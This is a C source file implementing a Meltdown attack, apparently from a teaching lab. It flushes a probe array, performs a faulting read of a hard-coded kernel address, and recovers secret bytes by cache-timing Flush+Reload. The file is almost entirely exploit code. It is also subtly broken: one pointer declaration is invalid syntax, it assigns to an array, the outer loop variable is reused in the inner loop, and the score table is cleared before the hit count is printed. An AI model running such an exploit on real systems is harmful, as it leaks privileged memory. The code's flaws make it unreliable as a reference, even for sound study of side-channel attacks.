#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define PAGESIZE 4096

uint8_t array[256*PAGESIZE];
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*PAGESIZE + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*PAGESIZE + DELTA]);

}

static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int tmp = 0;
  for (i = 0; i < 256; i++) {
     addr = &array[i * PAGESIZE + DELTA];
     time1 = __rdtscp(&tmp);
     tmp = *addr;
     time2 = __rdtscp(&tmp) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; /* if cache hit, add 1 for this value */
  }
}

void meltdown_asm(unsigned long kernel_data_addr)
{   int static m=0;
   char kernel_data[8] = {0};
   
   // Give eax register something to do
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // The following statement will cause an exception
   char kernel_data_addr1*=kernel_data_addr;
   kernel_data = *kernel_data_addr1;  
   array[kernel_data[m++] * PAGESIZE + DELTA] += 1;              
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
   siglongjmp(jbuf, 1);
}



int main()
{
  int i, j, ret = 0;
  
  // Register signal handler
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  
  memset(scores, 0, sizeof(scores));
  flushSideChannel();
  
	for(int i=0;i<8;i++){  
  // Retry 1000 times on the same address.
  for (i = 0; i < 1000; i++) {
	   ret = pread(fd, NULL, 0, 0);
	   if (ret < 0) {
	     perror("pread");
	     break;
	   }
	
	   // Flush the probing array
	   for (j = 0; j < 256; j++) 
		    _mm_clflush(&array[j * PAGESIZE + DELTA]);

	   if(sigsetjmp(jbuf, 1) == 0) {
		    meltdown_asm(0xf9fef000);
	   }

	   reloadSideChannelImproved();
  }

  // Find the index with the highest score.
  int max = 0;
  for (i = 0; i < 256; i++) {
	if (scores[max] < scores[i]) max = i;
  }

  memset(scores, 0, sizeof(scores));
  printf("The secret value is %d %c\n", max, max);
  printf("The number of hits is %d\n", scores[max]);
}
  return 0;
}
